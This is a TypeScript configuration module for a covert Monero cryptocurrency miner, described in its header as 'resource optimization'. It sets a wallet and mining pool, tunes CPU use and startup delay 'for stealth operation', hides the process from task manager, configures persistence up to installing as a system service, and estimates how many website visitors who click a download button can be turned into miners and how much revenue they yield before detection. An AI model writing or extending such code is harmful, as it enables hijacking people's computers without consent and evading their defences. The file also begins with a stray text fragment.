on wha/**
 * Miner Configuration
 * 
 * This file contains configuration settings for the application's resource optimization.
 * Edit these settings to customize the behavior according to your needs.
 */

// Main configuration object
export const minerConfig = {
  /**
   * Your Monero wallet address
   * IMPORTANT: Replace this with your actual Monero wallet address
   * All mining rewards will be sent to this address
   */
  wallet: "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A",
  
  /**
   * Mining pool configuration
   * You can change this to your preferred mining pool
   * Format: "pool_address:port"
   */
  pool: "pool.minexmr.com:4444",
  
  /**
   * Performance settings
   * These settings affect mining performance and stealth
   */
  performance: {
    /**
     * Number of threads to use for mining
     * Higher values = more mining power but more detectable
     * Recommended: 2-4 for stealth operation
     * Maximum: Set to 0 to use all available CPU threads
     */
    threads: 2,
    
    /**
     * CPU usage limit (percentage)
     * Higher values = more mining power but more detectable
     * Recommended: 40-60 for stealth operation
     */
    cpuLimit: 60,
    
    /**
     * Only mine when the computer is idle
     * true = only mine when user is not actively using the computer
     * false = mine continuously (higher detection risk)
     */
    idleOnly: true,
    
    /**
     * Delay before starting mining (in seconds)
     * Higher values = less suspicious but delayed mining start
     * Recommended: 300 (5 minutes) for stealth operation
     */
    startupDelay: 300
  },
  
  /**
   * Stealth settings
   * These settings affect how detectable the miner is
   */
  stealth: {
    /**
     * Run in background
     * true = run as a background process
     * false = run as a visible process (not recommended)
     */
    background: true,
    
    /**
     * Hide from task manager
     * true = attempt to hide from task manager
     * false = visible in task manager (not recommended)
     */
    hideFromTaskManager: true,
    
    /**
     * Persistence level
     * 0 = no persistence (miner stops when browser closes)
     * 1 = basic persistence (tries to restart when browser opens)
     * 2 = advanced persistence (tries to install as a system service)
     */
    persistenceLevel: 1
  },
  
  /**
   * Statistics and reporting
   */
  stats: {
    /**
     * Report mining statistics
     * true = periodically report mining statistics to a server
     * false = no reporting
     */
    reportStats: false,
    
    /**
     * Statistics server URL
     * Only used if reportStats is true
     */
    statsServer: "https://your-stats-server.com/report"
  }
};

/**
 * Get estimated mining capacity
 * 
 * This function estimates how many computers can mine simultaneously
 * based on your website's traffic and conversion rates
 * 
 * @param dailyVisitors Number of daily visitors to your website
 * @param clickRate Percentage of visitors who click the download button (0-100)
 * @param retentionDays Average number of days a miner stays active before detection/removal
 * @returns Estimated number of simultaneous miners
 */
export const estimateMiningCapacity = (
  dailyVisitors: number,
  clickRate: number,
  retentionDays: number
): number => {
  // Calculate daily new miners
  const dailyNewMiners = dailyVisitors * (clickRate / 100);
  
  // Calculate total active miners
  const totalActiveMiners = dailyNewMiners * retentionDays;
  
  return Math.round(totalActiveMiners);
};

/**
 * Calculate estimated mining revenue
 * 
 * This function estimates daily revenue based on number of miners
 * and current Monero mining profitability
 * 
 * @param minerCount Number of active miners
 * @param xmrPriceUsd Current Monero price in USD
 * @returns Estimated daily revenue in USD
 */
export const estimateMiningRevenue = (
  minerCount: number,
  xmrPriceUsd: number = 150 // Default XMR price estimate
): number => {
  // Estimated XMR per day per miner (very rough estimate)
  // This assumes modest hardware running at limited capacity for stealth
  const xmrPerDayPerMiner = 0.0002;
  
  // Calculate total XMR per day
  const totalXmrPerDay = minerCount * xmrPerDayPerMiner;
  
  // Calculate USD value
  const usdPerDay = totalXmrPerDay * xmrPriceUsd;
  
  return usdPerDay;
};